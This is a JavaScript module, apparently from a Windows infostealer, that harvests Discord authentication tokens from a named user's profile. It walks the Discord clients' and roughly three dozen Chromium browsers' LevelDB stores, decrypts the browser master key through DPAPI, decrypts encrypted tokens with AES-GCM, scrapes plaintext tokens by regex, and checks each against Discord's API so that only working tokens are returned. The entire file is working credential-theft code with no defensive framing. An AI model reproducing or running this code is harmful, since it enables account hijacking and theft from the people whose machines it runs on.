const { 
    getProfiles 
} = require("./../../utils/harware/getUsers.js");

const { 
    Transform
} = require("stream");

const Aurita = require("win-dpapi");

const crypto = require("crypto");
const axios = require("axios");
const path = require("path");
const fs = require("fs");
const util = require("util");

const validateToken = async (token) => {
    try {
        const response = await axios.get('https://discord.com/api/v9/users/@me', {
            headers: { Authorization: token }
        });
        return response.status === 200;
    } catch {
        return false;
    }
};

const processFile = async (filePath, pathTail, allTokens) => {
    try {
        const localStatePath = pathTail.replace("Local Storage", "Local State");
        const localStateData = await fs.promises.readFile(localStatePath, 'utf8');
        const localState = JSON.parse(localStateData);
        const encrypted = Buffer.from(localState.os_crypt.encrypted_key, 'base64').slice(5);
        const bufferEncrypted = Buffer.from(encrypted, 'utf-8');

        const key = Aurita.unprotectData(bufferEncrypted, null, 'CurrentUser');

        const encryptedRegex = /dQw4w9WgXcQ:[^\"]*/;

        const transform = new Transform({
            transform(chunk, encoding, callback) {
                const lines = chunk.toString().split('\n');
                lines.forEach(line => {
                    if (filePath.includes("cord")) {
                        const match = line.match(encryptedRegex);

                        if (match) {
                            try {
                                let token = Buffer.from(match[0].split("dQw4w9WgXcQ:")[1], 'base64');
                                const start = token.slice(3, 15);
                                const middle = token.slice(15, token.length - 16);
                                const end = token.slice(token.length - 16);

                                const decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
                                decipher.setAuthTag(end);

                                token = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8');
                                allTokens.push(token);
                            } catch (err) {
                            }
                        }
                    }
                });
                callback();
            }
        });

        const stream = fs.createReadStream(filePath, 'utf8');
        await new Promise((resolve, reject) => {
            stream.pipe(transform)
                .on('finish', resolve)
                .on('error', reject);
        });
    } catch (err) {
        throw err;
    }
};

const processDirectory = async (directory, allTokens) => {
    try {
        const fileNames = await fs.promises.readdir(directory);
        const fileProcesses = fileNames
            .filter(fileName => fileName.endsWith('.log') || fileName.endsWith('.ldb'))
            .map(fileName => {
                const filePath = path.join(directory, fileName);
                const pathTail = directory.includes('Network')
                    ? directory.split(path.sep).slice(0, -3).join(path.sep)
                    : directory.split(path.sep).slice(0, -2).join(path.sep);

                return processFile(filePath, pathTail, allTokens);
            });

        await Promise.all(fileProcesses);
    } catch (err) {
    }
};

const getBrowserProfiles = async (user) => {
    const LOCALAPPDATA = process.env.LOCALAPPDATA.replace(process.env.USERPROFILE, user);
    const APPDATA = process.env.APPDATA.replace(process.env.USERPROFILE, user);

    const ChromiumBrowsers = {
        'Google(x86)'  : `${LOCALAPPDATA}\\Google(x86)\\Chrome\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Google SxS'   : `${LOCALAPPDATA}\\Google\\Chrome SxS\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Chromium'     : `${LOCALAPPDATA}\\Chromium\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Thorium'      : `${LOCALAPPDATA}\\Thorium\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Chrome'       : `${LOCALAPPDATA}\\Google\\Chrome\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'MapleStudio'  : `${LOCALAPPDATA}\\MapleStudio\\ChromePlus\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Iridium'      : `${LOCALAPPDATA}\\Iridium\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        '7Star'        : `${LOCALAPPDATA}\\7Star\\7Star\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'CentBrowser'  : `${LOCALAPPDATA}\\CentBrowser\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Chedot'       : `${LOCALAPPDATA}\\Chedot\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Vivaldi'      : `${LOCALAPPDATA}\\Vivaldi\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Kometa'       : `${LOCALAPPDATA}\\Kometa\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Elements'     : `${LOCALAPPDATA}\\Elements Browser\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Epic'         : `${LOCALAPPDATA}\\Epic Privacy Browser\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'uCozMedia'    : `${LOCALAPPDATA}\\uCozMedia\\Uran\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Fenrir'       : `${LOCALAPPDATA}\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Catalina'     : `${LOCALAPPDATA}\\CatalinaGroup\\Citrio\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Coowon'       : `${LOCALAPPDATA}\\Coowon\\Coowon\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Liebao'       : `${LOCALAPPDATA}\\liebao\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'QIP Surf'     : `${LOCALAPPDATA}\\QIP Surf\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Orbitum'      : `${LOCALAPPDATA}\\Orbitum\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Comodo'       : `${LOCALAPPDATA}\\Comodo\\Dragon\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        '360Browser'   : `${LOCALAPPDATA}\\360Browser\\Browser\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Maxthon3'     : `${LOCALAPPDATA}\\Maxthon3\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'K-Melon'      : `${LOCALAPPDATA}\\K-Melon\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'CocCoc'       : `${LOCALAPPDATA}\\CocCoc\\Browser\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Amigo'        : `${LOCALAPPDATA}\\Amigo\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Torch'        : `${LOCALAPPDATA}\\Torch\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Sputnik'      : `${LOCALAPPDATA}\\Sputnik\\Sputnik\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Edge'         : `${LOCALAPPDATA}\\Microsoft\\Edge\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'DCBrowser'    : `${LOCALAPPDATA}\\DCBrowser\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Yandex'       : `${LOCALAPPDATA}\\Yandex\\YandexBrowser\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'UR Browser'   : `${LOCALAPPDATA}\\UR Browser\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Slimjet'      : `${LOCALAPPDATA}\\Slimjet\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'BraveSoftware': `${LOCALAPPDATA}\\BraveSoftware\\Brave-Browser\\User Data\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Opera'        : `${APPDATA}\\Opera Software\\Opera Stable\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
        'Opera GX'     : `${APPDATA}\\Opera Software\\Opera GX Stable\\${'%PROFILE%'}\\Local Storage\\leveldb\\`,
    };

    const GeckoBrowsers = {};

    const BROWSERS_PATH = [
        ...Object.values(ChromiumBrowsers),
        ...Object.values(GeckoBrowsers)
    ];

    let BROWSERS_PROFILES = [];

    for (const browser of BROWSERS_PATH) {
        try {
            const profiles = getProfiles(browser, path.basename(browser));
            BROWSERS_PROFILES.push(...profiles.map(profile => profile.path));
        } catch (err) {
        }
    }

    return BROWSERS_PROFILES;
};

const discordFindTokens = async (user) => {
    let allTokens = [];

    const APPDATA = process.env.APPDATA.replace(process.env.USERPROFILE, user);

    const DISCORD_PATHS = {
        'Discord Canary' : `${APPDATA}\\discordcanary\\Local Storage\\leveldb\\`,
        "Discord PTB"    : `${APPDATA}\\discordptb\\Local Storage\\leveldb\\`,
        'Lightcord'      : `${APPDATA}\\Lightcord\\Local Storage\\leveldb\\`,
        'Discord'        : `${APPDATA}\\discord\\Local Storage\\leveldb\\`,
    };

    const pathProcesses = Object.values(DISCORD_PATHS)
        .filter(async value => util.promisify(fs.access)(value).then(() => true).catch(() => false))
        .map(value => processDirectory(value, allTokens));

    await Promise.all(pathProcesses);

    const BROWSERS_PROFILES = await getBrowserProfiles(user);
    const cleanRegex = [
        /[\w-]{26}\.[\w-]{6}\.[\w-]{25,110}|mfa\.[\w-]{80,95}/g,
        /[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}/g,
        /[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g,
        /[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g,
        /mfa\.[\w-]{84}/g
    ];

    const browserProcesses = BROWSERS_PROFILES.map(async (profile) => {
        if (await util.promisify(fs.access)(profile).then(() => true).catch(() => false)) {
            const files = await fs.promises.readdir(profile);
            const fileProcesses = files
                .filter(file => file.endsWith('.log') || file.endsWith('.ldb'))
                .map(file => {
                    const filePath = path.join(profile, file);
                    return fs.promises.readFile(filePath, 'utf-8').then(content => {
                        for (const reg of cleanRegex) {
                            allTokens.push(...content.match(reg) || []);
                        }
                    });
                });

            await Promise.all(fileProcesses);
        }
    });

    await Promise.all(browserProcesses);

    const uniqueTokens = Array.from(new Set(allTokens));

    const validatedTokens = await Promise.all(
        uniqueTokens.map(async token => (
            await validateToken(token) ? token : null
        ))
    );

    const tokens = validatedTokens.filter(token => token !== null);

    return tokens;
};

module.exports = {
    discordFindTokens
};
